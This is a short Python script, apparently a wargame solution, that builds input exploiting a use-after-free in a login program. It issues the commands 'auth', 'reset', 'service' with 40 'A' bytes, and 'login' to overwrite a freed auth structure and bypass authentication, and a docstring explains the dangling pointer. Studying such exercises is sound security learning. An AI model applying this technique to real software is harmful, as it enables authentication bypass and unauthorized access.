
"""
Since after calling free auth pointer still points to the same location,
we can overwrite that location by using functionality of 'strdup' wihch allocates a location the new string 
that is closed to location pointed by auth.
Then it is a simple memory overwrite. 
"""

exploit = ""

# allocate memory for auth variable in memeory
exploit += "auth test\n"

# free auth vairable but auth pointer stays dangling
exploit += "reset\n" 

# overwrite auth->auth variable by using service
exploit += "service" + "A" * 40 + "\n"

# try login
exploit += "login\n"

print(exploit)